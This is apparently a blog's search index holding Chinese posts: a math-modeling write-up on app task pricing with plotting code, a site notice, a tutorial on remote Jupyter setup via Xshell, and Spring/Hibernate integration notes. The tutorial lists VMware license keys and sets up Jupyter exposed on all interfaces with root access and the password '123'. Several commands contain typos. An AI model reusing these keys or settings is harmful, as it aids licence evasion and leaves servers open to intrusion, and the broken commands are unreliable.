&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在分解之后，我们发现未完成的任务数据有313组，后面我们将针对这313组的数据进行原因分析。 ##### **5.1.2.2 任务的定价过低** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们不难发现，若公司对一组任务的定价过低，则定价很大可能不足以引起会员的接单欲望。所以，任务的定价过低很有可能是造成任务未完成的原因之一。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过对数据的观察我们可以发现，任务的定价皆在65~85之间。为此，我们将任务分为四个定价区间，即65~69、70~74、75~79、80~85四个数据区域。通过此分析，我们可以绘制数据的散点图以及他们的相关统计图，相关核心代码以及结果图示如下： 123456789101112131415161718192021222324252627282930def draw_no_scatter(): df = pd.read_csv(parent_path + \"/newdata/no.csv\") plt.scatter(np.arange(313), df[\"任务标价\"], s=20, c=\"red\", alpha=0.6, marker=\"*\") plt.title(\"任务未完成数据的价格分布\") plt.xlabel(\"Mission\") plt.ylabel(\"Price\") plt.savefig(parent_path + \"/images/no_price.jpg\") plt.show()def draw_no_bar(): df = pd.read_csv(parent_path + \"/newdata/no.csv\") df1 = df[(65 &lt;= df[\"任务标价\"]) &amp; (df[\"任务标价\"] &lt; 70)] df2 = df[(70 &lt;= df[\"任务标价\"]) &amp; (df[\"任务标价\"] &lt; 75)] df3 = df[(75 &lt;= df[\"任务标价\"]) &amp; (df[\"任务标价\"] &lt; 80)] df4 = df[(80 &lt;= df[\"任务标价\"]) &amp; (df[\"任务标价\"] &lt; 85)] data_len = [len(df1), len(df2), len(df3), len(df4)] plt.barh(np.arange(4), data_len, height=0.6, alpha=0.7, color=\"yellowgreen\") plt.ylabel(\"Price Region\") plt.xlabel(\"Num\") plt.title(\"未完成价格条形图\") plt.yticks(np.arange(4), [\"65-69\", \"70-74\", \"75-79\", \"80-85\"], rotation=45, size=13) for x, value in enumerate(data_len): plt.text(y=x, x=value, s=\"&#123;&#125;\".format(value), ha=\"center\") plt.savefig(parent_path+\"/images/price_bar.jpg\") plt.show() plt.pie(x=data_len, labels=[\"65-69\", \"70-74\", \"75-79\", \"80-85\"], autopct=\"%.0f%%\", shadow=True, radius=1.2) plt.legend([\"65-69\", \"70-74\", \"75-79\", \"80-85\"], loc=\"best\") plt.title(\"未完成价格饼图\") plt.savefig(parent_path+\"/images/price_pie.jpg\") plt.show() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过以上图的显示，我们在散点图中可以明显的看出任务定价在65-75的区间内明显占据绝大部分。从条形图和饼图中我们也能看出其所占比例之大。为此，我们可以确定之前的结论，即公司对任务定价过低的时候，不足以勾起会员完成任务的欲望，也就是说会员完成任务的可能性极小。 5.1.2.3 任务发布位置较远&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在原因一的分析中，除了任务定价在65-75之间之外，还有23组的任务的定价相对来说是比较高的。那么既然如此，会员未完成任务的原因是什么呢？为此，我们在这需要分析任务是否离城市中心的距离较远，从而导致会员完成任务的难度增大。 5.1.3 问题一总结&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过以上模块的分析，我们得出公司对任务定价主要从任务点位置、任务发布地的经济状况、会员预定任务限额、信誉值、集中度所决定。而任务未完成的原因主要是任务的定价较低以及任务较远导致。 5.2 多维度定价方案对项目的效益——问题二&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;“拍照赚钱”APP的任务定价是一种任务发布者（APP平台）与任务接受者（平台会员）之间所进行的互利模式，PP平台希望在成本一定的情况下使得任务的完成率尽可能的提高，而APP会员则需要在满足某种条件要求下追求收益尽可能大。在问题二中，要求为项目设计新的任务定价方案，则需要考虑以下几个方面： 该项目的总收益由两个因素决定，一是任务的实际定价，二是任务的实际完成情况。 站在公司的角度考虑，任务的定价是由平台根据相关数据而定的，而任务的定价在问题一中我们已做分析，影响任务定价的因素有该区域会员的信誉值、会员预定任务限额、会员与任务之间的距离、该区域的经济发展状况以及会员的集中密度。 站在会员的角度分析，任务的完成率由会员根据实际情况而定，而对任务完成率的影响因素主要有，任务的价格、会员与任务之间的距离以及该任务的竞争程度。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此之外，从实际出发，一份任务理论上可以分配给多个使其相互竞争，而一个会员亦可接受多份任务，这两者在初始阶段是一种“多对多”的关系。而最终的情况是一个任务只能分配给一个会员，而一个会员依然可以接受多份任务，这是一种“多对一”的关系。通过以上对该问题的分析，我们可以构建项目-会员-任务之间的关系图： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过上述的分析，对此本文主要从以下四个步骤进行解决该问题： Step1. 确定任务-会员空间分配算法Step2. 由问题一分析出的多因素对任务定价造成的影响，建立出多维度空间任务定价模型。Step3. 对任务完成度进行分析并构建会员抉择概率模型。Step4. 通过上述模型的构建最终确定能够体现出新方案效果的项目总收益模型。Step5. 使用Matlab、Python、Lingo三种编程语言来对模型进行求解并总结新方案的优势。 5.2.1 模型构建5.2.2.1 任务-会员空间分配&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们需要一个算法来对任务、会员之间进行合理的分配，以便后续模型的构建。出于体现出全国大学生数学建模竞赛的创新性，以下给出该任务-会员空间分配算法的实现流程图： 任务-会员距离矩阵:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用 $x_i$ 表示第 $i(i=1,2,\\cdots,n)$ 个任务，$y_j$ 表示第 $k(k=1,2,\\cdots,m)$ 个会员。以任务为节点，任务与每位会员之间的距离为对应的权重，为此构建该城市的任务-会员距离矩阵 $L^{(\\delta)} (\\delta=1,2,3,4)$，如下所示： \\begin{align} L^{(\\delta)} &=(D_{ik}^{(\\delta)})_{n\\times m} \\\\ &=\\left( \\begin{matrix} D_{11}^{(\\delta)} & D_{12}^{(\\delta)} & D_{13}^{(\\delta)} & \\cdots & D_{1m}^{(\\delta)}\\\\ D_{21}^{(\\delta)} & D_{22}^{(\\delta)} & D_{23}^{(\\delta)} & \\cdots & D_{2m}^{(\\delta)}\\\\ D_{31}^{(\\delta)} & D_{32}^{(\\delta)} & D_{33}^{(\\delta)} & \\cdots & D_{3m}^{(\\delta)}\\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots\\\\ D_{n1}^{(\\delta)} & D_{n2}^{(\\delta)} & D_{n3}^{(\\delta)} & \\cdots & D_{nm}^{(\\delta)}\\\\ \\end{matrix} \\right) \\end{align} D_{ik}^{(\\delta)} = R*arccos[sin{\\varphi_i}*sin{\\varphi_k}+cos{\\varphi_ i}cos{\\varphi_k}cos(\\theta_i-\\theta_k)]5.2.2.2 多维度空间任务定价模型&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过问题一的分析，我们已经知道了多因素对任务定价产生的影响规律，主要体现在以下多个方面： 在以某个任务为中心的一定区域内，若该区域中的会员信誉值较小时，则该任务的定价普遍较低。 随着会员离任务的距离逐渐增大，则任务的定价普遍按照一定的波动规律有所提高。 若城市的经济状况较为发达，则该城市的任务定价相对较低。 如若会员的集中密度逐渐增大，则任务的定价按照一定趋势有所下降。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在上一模块中，我们已经通过任务-会员空间分配模型分别对任务分配了相对应的会员量，并将其距离数据存储于矩阵 $L_\\delta$ 中，但为了避免影响其他因素之间复杂的相关性以及给模型求解带来一定的难度，我们首先需要使用 $Z-score^{[1]}$模型对矩阵中数据进行归一化处理： D_{ik}^{(\\delta)*}=\\frac{D_{ik}^{(\\delta)}-\\mu}{\\sigma} \\sigma=\\sqrt{\\frac{1}{n\\times m}\\sum_{i=1}^{n}\\sum_{k=1}^m(D_{ik}^{(\\delta)}-\\mu)^2} \\mu = \\frac{1}{n\\times m}\\sum_{i=1}^{n}\\sum_{k=1}^mD_{ik}^{(\\delta)},\\ L^{(\\delta)*} = (D_{ik}^{(\\delta)*})_{n\\times m}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同理，我们可以对矩阵中所对应会员的信誉值做归一化处理。通过上述分析，为此，我们可以构建多维度空间任务定价模型： P_{i}=\\frac{K}{E^{(\\delta)}}\\sqrt[a]{(K_1\\frac{\\overline{C_i}}{\\rho_i})^a+(K_2\\frac{\\overline{D_i}}{\\rho_i})^a} + \\xi \\overline{C_i}=\\frac{1}{m}\\sum_{k=1}^mc_k,\\ \\overline{D_i}=\\frac{1}{m}\\sum_{k=1}^{m}D_{ik}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中，$\\overline{C_i}$ 表示该任务点所在领域内会员信誉期望值，$\\overline{D_i}$ 表示任务点所在领域内会员位置期望值，$E^{(\\delta)}$表示任务所在城市的经济系数，$\\rho_i$ 表示任务所在领域内会员密度值，$K,K_1,K_2$ 表示价格与多维度因素之间的比例系数，$\\xi$ 表示该方案的容错误差值。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同时，我们可以通过上述四个城市的GDP（国内生产总值）来确定该模型的经济系数 $E^{(\\delta)}$： 城市 深圳 广东 佛山 东莞 $E^{(\\delta)}$ 1.949260 1.961094 0.800392 0.627506 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终，确定的多维度空间任务定价模型如下： P_{i}=\\frac{K}{E^{(\\delta)}}\\sqrt[a]{(K_1\\frac{1}{m\\rho_i}\\sum_{k=1}^mc_k)^a+(K_2\\frac{1}{m\\rho_i}\\sum_{k=1}^mD_{ik})^a} + \\xi5.2.2.3 会员抉择概率模型&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样，在上述的分析中，我们已经把影响任务完成度的因素归结于任务的定价、任务位置、任务竞争度。且这三种因素的影响如下： 若某一任务的定价较高时，任务对会员的吸引度较大，该任务被完成的概率也随之增大。 从实际出发，若任务离会员越远，任务对会员的吸引度越小，该任务被完成的概率也随之减小。 若一任务的会员竞争度较大，即该会员被较多的会员相中，相应的任务被完成的概率较高。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，任务完成与否是由会员对任务所能获得期待的效益决定，当该效益值达到一定的阈值时，我们可以认为该任务被领域内的会员完成的概率较高，对此，我们应该建立该任务-会员吸引度模型： A=\\lambda\\frac{P_iQ_i}{\\overline{D_{i}}}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中，$Q_i$ 表示任务的竞争度，在这里我们可以将上述任务-会员矩阵中每行的会员数。根据实际情况，我们认为若一个任务的定价小于70，归一化后的距离大于0.8，被相中的会员数小于3，我们任务该任务完成的概率为0，其所对应的任务对会员的吸引度为 $A_1\\leq10$；同样若某个任务的定价大于80，归一化后的距离小于0.2，被相中的会员数大于8，我们认为该任务被完成的概率为1，其所对应的任务吸引度为 $A_1\\geq90$。根据上述信息，我们可以确定 $\\lambda$ 的值： \\lambda=\\frac{1}{2}(\\frac{A_1 \\overline{D_i^1}}{P_i^1Q_i^1}+\\frac{A_2 \\overline{D_i^2}}{P_i^2Q_i^2})&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经计算，$\\lambda=0.042634$。对此，我们可以确定任务-会员吸引度模型最终为： A = \\begin{cases} A_1, & P_i80,Q_i>8,\\overline{D_i}","path":"2018/09/26/基于多维度空间分配算法实现APP任务定价/"},{"title":"本站须知","text":"阅前建议本站所有内容建议务必在PC端进行阅读，手机端的阅读效果可能不佳，也许会影响到您的阅读体验，给您带来不便敬请谅解。 免责声明本站部分所总结的内容涉及到Kali渗透，具有一定的攻击行为，所以仅供博主记录之用，切勿用于非法操作，一切后果由使用者本人自负。 博主希望本站所记录的内容没有特别标注的皆为博主日常学习所总结，欢迎各位的转载，转载时注明链接与作者即可。 本站转载文章会在醒目处留有说明，如有侵权还请联系。 如果本站内容能给你带来帮助那最好不过了，如果不喜欢的话可不要扔鸡蛋，谢谢。","path":"2018/09/26/本站须知/"},{"title":"Xshell远程连接linux并远程访问Jupyter notebook服务（机器学习环境的搭建）","text":"前言如今，机器学习、人工智能、深度学习等高深知识逐渐融入大家的视野，为了跟上技术的更新，不被时代所淘汰、out、出局，博主也想打算开始深度学习。而据说如今机器学习最好的环境是Python + Jupyter notebook + Tensorflow了，为此首先需要搭建一个这么个环境，以便开始深度学习之旅。此外，若能搭建一个自己的深度学习服务器再好不过了，所以本文将从以下三个部分的内容进行介绍： 环境准备 Xshell远程连接Ubuntu Jupyter notebook服务器的配置及远程访问 远程环境的测试 OK，话不多说，开始进入正轨吧。(#`O′) 一、环境准备环境介绍 准备两台计算机，一个作为服务端，一个作为客户端。 服务端：Linux系统（Ubuntu）官方介绍：Ubuntu（友帮拓、优般图、乌班图）是一个以桌面应用为主的开源GNU/Linux操作系统，Ubuntu 是基于Debian GNU/Linux，支持x86、amd64（即x64）和ppc架构，由全球化的专业开发团队（Canonical Ltd）打造的。Linux系统区别于windows系统最大的区别是其主要是利用终端 Shell 命令来进行一系列的操作，所以在实际使用过程中常常用来搭建服务器，该系统搭建在VMware虚拟机中。 客户端：Windows10系统这个大家再熟悉不过了，就不介绍了。 Anaconda官方介绍：Anaconda指的是一个开源的Python发行版本，其包含了conda、Python等180多个科学包及其依赖项。所以说，当我们下载了Anaconda之后就不必要再下载Python其他包了，其内部集成了大量大Python工具，其中就包括我们这篇文章的主角Jupyter notebook。 Xshell这个就没什么好说的了，它主要是一种远程连接的工具，使用它之后我们就可以通过ssh协议来远程连接Ubuntu系统了，而且它常常与远程文件传输工具Xftp配套使用。 软件下载这里给大家两种方式进行下载，一个是官网下载，一个是鄙人的网盘下载，大家根据自己的方便下载即可。 官网： Anaconda：https://www.anaconda.com/download/，于服务端下载 Xshell：https://xshell.en.softonic.com/?ex=BB-682.0，于客户端下载 Ubuntu：https://www.ubuntu.com/download/desktop，于服务端下载 VMware：https://www.ubuntu.com/download/desktop，于服务端下载 网盘： Anaconda：https://pan.baidu.com/s/1Z4XuYwYvK6CqJigSrEWjuQ， 密码：1pbs，于服务端下载 Xshell：https://pan.baidu.com/s/1KKqsFrhbPUM2Yc_Jukm5sw， 密码：fi0y，于客户端下载 Ubuntu：https://pan.baidu.com/s/1Zwz1GGlEtlStnS-5OFsecQ， 密码：50yw，于服务端下载 VMware：https://pan.baidu.com/s/1-h0HLJGrXbJjwzfU5I2rww， 密码：hjnq，于服务端下载 VMware下安装Ubuntu注意：以下内容都是在服务端计算机中进行配置 在VMware虚拟机下安装Ubuntu系统虽然有点步骤，但是并不复杂。在综合考虑到时间成本与其给大家带来的价值的关系下，博主就用文字描述了，暂时不贴图了。但是你不必担心，关键步骤还是会贴图说明的 ( ﹁ ﹁ ) ~→。 在服务端下载好VMware及Ubuntu之后。首先打开VMware你会发现他会让你输入VMware秘钥，以下将给出几个目前有效的秘钥，当你使用的时候也许已经失效了，你可以自行百度查找秘钥： 12345FF31K-AHZD1-H8ETZ-8WWEZ-WUUVACV7T2-6WY5Q-48EWP-ZXY7X-QGUWDZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8ZC5XK-A6E0M-080XQ-04ZZG-YF08DZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8 输入秘钥之后 ，进入到了VMware的页面了，为了缩短文章的字数，博主还是使用windows自带的mspaint来绘制一个流程图来为大家介绍下Ubuntu的安装吧，尽量简洁明了： 原本以为制作这个流程图用不了多少时间，结果却用了20分钟，但是如此一来思路清晰、逻辑性强，值了（好吧，不吹自己了，还有很大的提升空间），w(ﾟДﾟ)w。好了，至此Ubuntu就已经安装好了，如果有卡壳的地方可在文章末留言或者左侧的Gitalk留言。 Ubuntu下Anaconda的安装在VMware下安装好Ubuntu后，虽然Ubuntu内自带了Python，但是其版本是2.7的，而且许多常用的包并没用集成，所以我们还需要安装Anaconda。 根据以上Anaconda的下载方式下载Anaconda，进入到其目录之下（或者cd操作），然后打开终端，执行如下命令进行安装：1bash Anaconda3-5.3.1-Linux-x86_64.sh # 不要盲目的复制粘贴，根据自己所下载的Anaconda版本执行 执行之后会有一些列诸如同意协议之类的问题，我们默认即可（直接Enter，或者yes），直到出现Anaconda环境变量配置的显示，我们需要选择将其加入到环境变量中去。一系列操作之后，我们关闭终端然后在重新打开终端，然后在终端分别执行conda list、python命令，如果你的终端界面出现类似以下输出，则恭喜你说明你已经完成了anaconda的安装。 而如果你的终端输错报错（未找到conda命令之类的）或者Python版本为2.7，那就说明你以上操作中未将Anaconda加入到环境变量，所以你需要手动配置Anaconda的环境变量，操作如下：123# 打开环境变量的配置文件，从这里我们就可以看出Linux和Windows下的操作的区别了# windows一般是通过界面的形式进行设置，而Linux下则大多数通过终端并使用vim进行配置sudo vim gedit /root/.bashrc 打开文件之后我们需要在文件末尾添加如下内容1export PATH=\"XXX:$PATH\" # XXX为你的Anaconda的bin目录，例如我的是/home/lxj/anaconda3/bin 然后保存，在终端输入source ~/.bashrc进行更新即可完成Anaconda环境变量的配置，不出意外的话再次分别执行Python、conda list命令之后你会看见正确的输出了。 补充：这里需要说明一下，以上的操作是使用Vim进行文件编辑的，他不同于windows下的记事本等，而是通过特定的操作来对文件进行编辑。对于熟悉Vim操作的应该会理解以上Anaconda环境变量的配置，然而如果是对Vim比较陌生的朋友可能会卡壳，所以在这里简单介绍一些vim的操作。 在终端使用vim命令之后将会进入到vim的界面，此时的界面是不允许modify任何内容的，只允许read only。此时我们输入i将会进入到vim的编辑模式，现在就能对该文件进行修改了。文件内容修改完成之后，我们需要退出该vim编辑模式，vim 的退出常用的有以下几种（首先输入Esc键）： q! -&gt; 不保存文件修改并退出 wq -&gt; 保存文件的修改并退出 wq! -&gt; 有时候我们需要root权限才能编辑文件，使用该命令之后就能够强制修改并退出对于以上Anaconda环境变量的配置，vim的熟悉至此就足够了，但是顺便介绍一下其他常用的命令供大家参考，也是记录一下方便以后的回顾： dd -&gt; 剪切当行内容 Ctrl+b -&gt; 内容向前移动一页 ctrl+f -&gt; 内容向后移动爷爷 shift+g -&gt; 鼠标指针定位到最后常用的就是以上一些了，其他的操作有需要的话在来看看。 注意：以上内容都是在服务端计算机中进行配置 好了，好了，好了。至此，我们已经完成了环境的搭建，接下来我们将介绍如何使用Xshell远程连接Ubuntu操作，拿好你的小板凳快快做好。 二、Xshell远程连接Ubuntu注意：以下内容都是在客户端计算机中进行配置 安装好Anaconda之后，我们需要通过Xshell使用Xshell来远程连接我们的Ubuntu系统，此时我们的目标需要转移至客户端了。首先在以上软件下载中根据链接下载Xshell，之后Windows傻瓜式安装好Xshell（顺便把Xftp安装下，与Xshell配套使用的，虽然在本文中使用不到）。之后的操作会有几个坑，但是不必担心，博主会带你一个一个的填掉 o(*≧▽≦)ツ┏━┓。 坑一：连接失败我们双击打开Xshell，并点击文件并新建，然后根据如下图进行操作： 补充，上方中的主机属性是填Ubuntu的ip地址，该地址可在Ubuntu的终端执行ifconfig（windows是ipconfig）命令得到。 以上信息填写完之后在出现的界面输入自己Ubuntu下的用户登录密码即可。执行之后你花发现连接失败，此时需要检查一下Ubuntu是否与客户端处于同一网段下，可以将Ubuntu设置成桥接模式（右键Ubuntu虚拟机然后进行设置），之后再次检查一下客户端（Windows10）是否能够ping通服务端（Ubuntu），在客户端的cmd中执行如下：1ping XXX.XXX.XXX.XXX # XXX.XXX.XXX.XXX为服务端的ip 在以上操作之后，一般就能ping通了，如果失败了则在Ubuntu终端下执行sudo wfw disable命令关闭防火墙。 坑二：连接失败 (ノへ￣、) 在如上操作之后，我们再次尝试重新连接。我们可以发现依然连接失败，显示拒绝连接之类的信息。这是因为Xshell是通过ssh协议来连接Ubuntu的，但是Ubuntu默认是没有开启ssh服务的，所以我们需要在其终端执行如下命令来开启ssh服务：1sudo service ssh restart 之后我们再次尝试连接。 坑三：连接失败 (ノへ￣、) (ノへ￣、) 一般来讲，这个时候依然是连接失败，此时我们需要安装在Ubuntu下安装ssh服务，执行以下命令进行安装：1sudo apt-get install openssh-server 待其安装好后，我们再再再次连接Ubunut。 OK，以上坑踩过之后也该连接成功了吧。的确此时你将成功连接到Ubuntu了，之后Xshell将打开一个终端，这个终端就是Ubuntu下的终端了，也就是说我们可以使用该终端控制Ubuntu了，并对其进行Shell操作。ヽ(✿ﾟ▽ﾟ)ノ 三、Jupyter notebook服务器的配置及远程访问由于我们在之前已经安装过了Anaconda，所以此时的Ubuntu就已经集成了ipython as well as （秀一下英语，虽然很烂）jupyter-notebook，对此，将通过Xshell远程连接Ubuntu来搭建Jupyter notebook的服务器，并对其进行远程访问。 在终端中启动ipython或者python，然后执行以下命令12from IPython.lib import passwdpasswd() 上述命令执行之后将会在终端显示设置密码，比如在这我们将密码设置成：123，之后enter并确认即可。 注意：这里的密码是暗文的形式，输入之后不会显示的，还有此时你输入的密码需要记住，因为我们待会远程访问jupyter notebook服务器的时候需要用到该密码进行登录 密码输入之后，我们将会看到有一个较长字符串，该字符串是上述密码的加密形式，我们需要将其复制下来，在之后的ipython_notebook_config.py文件的设置中需要使用，操作结果如下图所示： 随后为了方便上述加密密码字符串的记录，我们在此开启另一个终端（这也是Xshell的方便所在），然后使用如下命令创建一个服务器名，比如，在此我们将该名字设置为：XXX1ipython profile create txj 在上述服务器名创建完成之后，将在终端输出两个py文件（ipython_config.py、ipython_kernel_config.py）路径，之后使用如下cd命令我们进入到.ipython路径1cd .ipython/ 操作图示如下： 进入.ipython目录之后使用ls命令将会列出上述创建的两个py文件所在，但是我们需要再额外创建一个py配置文件并对其进行设置，在这里我们使用vim来进行操作，关于vim的使用，上述的Anaconda环境配置过程中已经介绍了，遗忘的朋友可以返回看一看再熟悉一下。熟悉之后我们完成如下步骤：12cd .ipython/profile_txj # 终端进入.ipython路径vim ipython_notebook_config.py # 使用vim进行创建ipython_notebook_config.py并对其进行编辑 进入到vim环境之后我们在ipython_nnotebook_config.py文件中编辑如下内容：1234567c = get_config()c.IPKernelApp.pyalb = \"inline\"c.NotebookApp.ip = \"*\"c.NotebookApp.open_browser = Falsec.NotebookApp.allow_root = Truec.NotebookApp.password = u\"加密后的密码\" # 这里我们需要使用上述加密后的密码，在另一个终端可见c.NotebookApp.port = 8888 # 在这里，我们需要设置一个jupyter-notebook的端口，尽量设置的少见点，以免造成端口冲突 编辑好后，wq命令保存并退出。 在上述一切操作完成之后，我们现在来开启该服务器，新建一个终端并执行如下命令12jupyter notebook --config=你的ipython_notebook_config.py文件路径 # 例如/home/lxj/.ipython/profile_XXX/ipython_notebook_config.py 在上述命令执行之后，如果出现如下图片所示内容，则说明我们的服务端已经正常启动 在服务端启动完成之后，我们在客户端打开浏览器，访问XXX.XXX.XXX.XXX:8888（ubuntu的ip加开放的端口）试试，看看能否正常请求。如果随后出现一个如上所示的Jupyter notebook的登录页面，那么恭喜你，至此Jupyter notebook服务器配置完成，并能够远程访问了。在表单中输入你所设置的密码（上面第一步设置的密码，123）即可开始你的深度学习之旅了。 以上就是Jupyter notebook服务器的配置及远程访问的内容了，但是能否正常使用requests、numpy、pandas、matplotlib、Tensorflow呢，我们下面将通过几个简单的例子来对其进行测试。 四、远程环境的测试通过上述的操作，我们已经完成了远程操作。但是保险起见，我们对其进行验证，看看anaconda下的第三方包能否正常使用。为此，我们通过以下几个案例来进行验证： 百度及其子链接的简单爬虫（requests， BeautifulSoup） 数据可视化操作（pandas，numpy，matplotlib，skimage） 机器学习之鸢尾花的分类预测（sklearn， numpy） 4.1 简单爬虫123456789101112import requestsfrom bs4 import BeautifulSoupdef get_page(url, headers): return requests.get(url).textif __name__ == \"__main__\": baidu_url = \"https://www.baidu.com\" baidu_soup = BeautifulSoup(get_page(baidu_url), \"lxml\") son_links = [biaoqian_a.attrs[\"href\"] for biaoqian_a in baidu_soup.find_all(\"a\")] for index, son_link in enumerate(son_links): print(\"正在请求第&#123;&#125;个页面\".format(str(index))) print(get_page(son_link)) 4.2 数据可视化123456789101112% matplot inlineimport numpy as npimport pandas as pdfrom amtplotlib import pyplot as pltimport skimagex = np.random.uniform(1, 100, 100)y = np.random.uniform(1, 100, 100)plt.plot(x, y)plt.show()XXXXXXXX 4.3 支持向量机下的鸢尾花的识别1XXXX 总结通过上述的演示，已经完成了windows10下使用xshell远程连接linux系统以及远程访问jupyter-notebook服务，并通过几个小例子来对其进行验证说明可以正常使用linux下的anaconda。虽然msi computer不支持在本机安装linux系统，但是我们依然可以在另一台computer中安装并远程进行访问，而且其中的优势也是显而易见的： 并不像以前那样虚拟机和物理机都在同一台computer中运行，而是将其中一台computer作为linux服务器，然后使用xshell对其进行远程操作，在一定程度上减小其压力。 方便了各个进程之间的管理且易于操作 。。。。。。 2018-09-23,By Zero","path":"2018/09/23/Xshell远程连接linux并远程访问ipython服务/"},{"title":"基于MyEclipse的SSH框架整合","text":"以下内容为博主学习Struts+Spring+Hibernate框架时所写笔记，有点凌乱，还未整理。 1. 将Spring与Hibernate进行整合1.1 为项目添加Spring的开发支持 在实际开发的过程中一定要先啊添加Spring而不是Hibernate，否则会出现难以捉摸的bug。 1.1.1 创建一个新的web项目SSHDemo1.1.2 添加Spring configure facets install spring facet next勾上Spring Persistence，在这里面有个orm开发包，含有Hibernate整合、IBatis整合、JDO等整合。 1.2 添加Hibernate configure facets install Hibernate, 暂时选择Hibernate4.1 facet，如果Hibernate交给了Spring管理，那么Hibernate不再需要HibernateSessionFactory工具类的生成，随后SessionFactory交给了Spring负责管理，但是需要生成hibernate.cfg.xml文件，这个文件不再进行数据库，只进行相关的 将Create SessionFactory class去掉，√上Create hibernate.cfg.xml file-&gt; next 打开mysql：windows -&gt; perspective -&gt; open perspective -&gt; other -&gt; database explore -&gt; 之后就可以右键添加自己的数据库了 在上一步完成之后就可以在配置DB Driver的时候选择mysql了 -&gt; next -&gt; finish 1.3 将Spring和Hibernate进行整合1.3.1 修改hibernate.cfg.xml文件1234567891011121314&lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;!DOCTYPE hibernate-configuration PUBLIC \"-//Hibernate/Hibernate Configuration DTD 3.0//EN\" \"http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd\"&gt;&lt;!-- Generated by MyEclipse Hibernate Tools. --&gt;&lt;hibernate-configuration&gt; &lt;session-factory&gt; &lt;property name=\"dialect\"&gt;org.hibernate.dialect.MySQLDialect&lt;/property&gt; &lt;property name=\"show_sql\"&gt;true&lt;/property&gt; &lt;property name=\"format_sql\"&gt;true&lt;/property&gt; &lt;/session-factory&gt;&lt;/hibernate-configuration&gt; 1.3.2 建立一个database.properties文件，用于保存所有数据连接的信息123456789db.driver=com.mysql.cj.jdbc.Driverdb.url=jdbc:mysql://localhost:3306/test?useSSL=true&amp;serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=UTF-8db.user=rootdb.password=123pool.max=1pool.min=1pool.init=10pool.idle=20 1.3.3 配置applicationContext.xml文件要想将Spring和Hibernate进行整合，那么就需要配置applicationContext.xml文件，以下是常用的配置步骤，每个步骤分别对应后面的代码。 在namespace中勾上context，用于添加Annotation支持 添加支持Annotation 通过classpath加载databasse.properties文件 配置数据库连接池 配置Hibernate的相关环境，SessionFactory可以打开Session 事务配置的声明 定义事务的切入点 添加支持Annotation 123&lt;!-- 配置annotation的支持操作 --&gt; &lt;context:annotation-config/&gt; &lt;context:component-scan base-package=\"com.tianxingjian\"/&gt; 通过classpath加载databasse.properties文件 12&lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt; &lt;context:property-placeholder location=\"classpath:database.properties\"/&gt; 配置数据库连接池 1234567891011&lt;!-- 配合数据库连接池 --&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;db.driver&#125;\"/&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;db.url&#125;\"/&gt; &lt;property name=\"user\" value=\"$&#123;db.user&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;db.password&#125;\"/&gt; &lt;property name=\"maxPoolSize\" value=\"$&#123;pool.max&#125;\"/&gt; &lt;property name=\"minPoolSize\" value=\"$&#123;pool.min&#125;\"/&gt; &lt;property name=\"initialPoolSize\" value=\"$&#123;pool.init&#125;\"/&gt; &lt;property name=\"maxIdleTime\" value=\"$&#123;pool.idle&#125;\"/&gt; &lt;/bean&gt; 配置Hibernate的相关环境，SessionFactory可以打开Session 123456789&lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt; &lt;bean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate4.LocalSessionFactoryBean\"&gt; &lt;property name=\"configLocation\" value=\"classpath:hibernate.cfg.xml\"&gt; &lt;/property&gt; &lt;!-- 就表示这个项目里面引用数据源关系 --&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt; 事务的配置声明 123456789101112131415161718&lt;!-- 事务的配置声明 --&gt; &lt;tx:annotation-driven transaction-manager=\"transactionManager\" /&gt; &lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\"&gt; &lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt; &lt;tx:attributes&gt; &lt;tx:method name=\"insert*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"update*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"delete*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"add*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"edit*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"change*\" 